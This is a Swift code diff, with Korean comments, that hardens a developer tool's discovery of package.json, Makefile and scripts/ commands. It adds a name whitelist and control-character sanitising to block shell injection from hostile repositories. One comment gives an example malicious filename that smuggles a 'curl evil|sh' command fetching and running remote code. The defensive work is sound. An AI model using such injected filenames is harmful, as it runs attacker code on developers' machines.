@@ -30,10 +30,11 @@ enum PackageManager: String, CaseIterable, Identifiable {
 }
 
 /// 스크립트가 어디서 왔나 — 목록에서 출처를 밝혀 "이게 왜 여기 있지"를 없앤다.
+/// **파서가 있는 출처만 둔다** — 라벨만 있고 탐지가 없으면 "지원되나 보다"라는 거짓 신호가 된다
+/// (justfile이 그랬다). 되살릴 땐 파서·discover 분기와 함께.
 enum ScriptSource: String {
     case packageJSON = "package.json"
     case makefile = "Makefile"
-    case justfile = "justfile"
     case shell = "scripts/"
 }
 
@@ -50,6 +51,34 @@ struct ProjectScript: Identifiable, Equatable {
 
 /// 프로젝트 스크립트 탐지 — 순수 파싱은 여기, 파일 읽기(부작용)는 `discover`에만.
 enum ProjectScripts {
+    // MARK: 신뢰 경계 — package.json·Makefile·scripts/ 는 **리포가 주는 값**이다(적대적일 수 있다)
+
+    /// 스크립트 이름으로 인정할 문자 — `^[A-Za-z0-9._:-]+$` (`build:prod`·`test.e2e`·`dev-server`).
+    ///
+    /// 이름은 그대로 실행 명령이 된다(`pnpm run <이름>`). 공백·따옴표·`;`·`$`가 든 이름을 받아들이면
+    /// 그 명령이 로그인 셸을 거칠 때 **한 줄이 여러 명령으로 쪼개진다.** 여기서 이름 자체를 좁힌다.
+    static func isValidName(_ name: String) -> Bool {
+        !name.isEmpty && name.allSatisfy {
+            $0.isASCII && ($0.isLetter || $0.isNumber || $0 == "." || $0 == "_" || $0 == ":" || $0 == "-")
+        }
+    }
+
+    /// 화면에 그릴 문자열에서 **제어문자·개행을 걷어낸다.**
+    ///
+    /// 개행이 남으면 한 줄짜리 미리보기가 뒷부분(진짜 실행될 payload)을 화면 밖으로 접어버리고,
+    /// note가 명령인 척 위장할 수 있다. 이름·설명·명령 미리보기가 모두 이걸 통과한다.
+    static func sanitize(_ text: String) -> String {
+        String(text.unicodeScalars.filter { !CharacterSet.controlCharacters.contains($0) })
+            .trimmingCharacters(in: .whitespaces)
+    }
+
+    /// 스크립트가 실제로 실행할 명령 — **정책은 여기 있다(뷰가 아니라).**
+    /// package.json만 패키지 매니저로 조립하고(`pnpm run dev`), Makefile·셸 스크립트는
+    /// 이미 완성된 명령이다(`make dev`·`./scripts/dev.sh`).
+    static func command(for script: ProjectScript, manager: PackageManager) -> String {
+        script.source == .packageJSON ? manager.runCommand(script.name) : script.body
+    }
+
     /// package.json 문자열 → 스크립트 목록. 깨진 JSON이면 빈 배열(죽지 않고, 지어내지도 않는다).
     ///
     /// **설명(주석)** — package.json은 JSON이라 진짜 주석이 없다. 실제로 쓰이는 두 관례를 읽는다:
@@ -73,9 +102,11 @@ enum ProjectScripts {
         }
 
         return scripts.compactMap { name, value -> ProjectScript? in
-            guard !name.hasPrefix("//"), let body = value as? String else { return nil }
-            return ProjectScript(name: name, body: body,
-                                 note: info[name] ?? comments[name], source: .packageJSON)
+            // 이름이 규약을 벗어나면 **버린다** — 이름이 곧 실행 명령이 된다(`pnpm run <이름>`).
+            guard !name.hasPrefix("//"), isValidName(name), let body = value as? String else { return nil }
+            let note = (info[name] ?? comments[name]).map(sanitize)
+            return ProjectScript(name: name, body: sanitize(body),
+                                 note: note?.isEmpty == false ? note : nil, source: .packageJSON)
         }
         // JSON 딕셔너리는 순서가 없다 — 목록이 매번 뒤바뀌지 않도록 이름순으로 고정한다.
         .sorted { $0.name < $1.name }
@@ -95,13 +126,16 @@ enum ProjectScripts {
 
             let name = String(raw[raw.startIndex..<colon]).trimmingCharacters(in: .whitespaces)
             // 타깃 이름 규칙 — 특수 타깃(.PHONY)·패턴(%)·변수 대입(CC = gcc, X := y)을 배제한다.
-            guard !name.isEmpty, !name.hasPrefix("."), !name.contains("%"), !name.contains(" "),
-                  !name.contains("=") else { continue }
+            // 이름은 `make <이름>`으로 조립돼 셸을 타므로 package.json과 **같은 화이트리스트**를 통과해야 한다.
+            guard !name.hasPrefix("."), isValidName(name) else { continue }
+            // 변수 대입은 타깃이 아니다 — `X := y`뿐 아니라 `X ::= y`(POSIX 즉시 대입)도 걸러야 한다.
+            // 콜론을 더 걷어낸 뒤 `=`면 대입이다. `foo:: bar`(이중 콜론 **규칙**)는 진짜 타깃이라
+            // 남는다 — 콜론만 보고 자르면 그것까지 함께 잃는다.
             let after = raw[raw.index(after: colon)...]
-            guard !after.hasPrefix("=") else { continue } // `X := y`
+            guard !after.drop(while: { $0 == ":" }).hasPrefix("=") else { continue }
 
             let note = after.range(of: "##").map {
-                after[$0.upperBound...].trimmingCharacters(in: .whitespaces)
+                sanitize(String(after[$0.upperBound...]))
             }
             targets.append(ProjectScript(name: name, body: "make \(name)",
                                          note: note?.isEmpty == false ? note : nil, source: .makefile))
@@ -116,7 +150,7 @@ enum ProjectScripts {
             let t = line.trimmingCharacters(in: .whitespaces)
             if t.isEmpty || t.hasPrefix("#!") { continue }
             guard t.hasPrefix("#") else { return nil } // 코드가 시작됐다 — 설명 없음
-            let note = t.dropFirst().trimmingCharacters(in: .whitespaces)
+            let note = sanitize(String(t.dropFirst()))
             return note.isEmpty ? nil : note
         }
         return nil
@@ -148,11 +182,14 @@ enum ProjectScripts {
         let scriptsDir = (dir as NSString).appendingPathComponent("scripts")
         guard let names = try? FileManager.default.contentsOfDirectory(atPath: scriptsDir) else { return [] }
         return names.filter { $0.hasSuffix(".sh") }.sorted().compactMap { file in
+            let name = (file as NSString).deletingPathExtension
+            // 파일명도 그대로 명령이 된다(`./scripts/<파일>`) — 이름·타깃과 같은 화이트리스트를 통과해야 한다.
+            // (`dev; curl evil|sh.sh` 같은 파일명은 적대적 리포가 심을 수 있다.)
+            guard isValidName(name) else { return nil }
             let path = (scriptsDir as NSString).appendingPathComponent(file)
             guard FileManager.default.isExecutableFile(atPath: path) else { return nil }
             let note = (try? String(contentsOfFile: path, encoding: .utf8)).flatMap(shellScriptNote)
-            return ProjectScript(name: (file as NSString).deletingPathExtension,
-                                 body: "./scripts/\(file)", note: note, source: .shell)
+            return ProjectScript(name: name, body: "./scripts/\(file)", note: note, source: .shell)
         }
     }
 
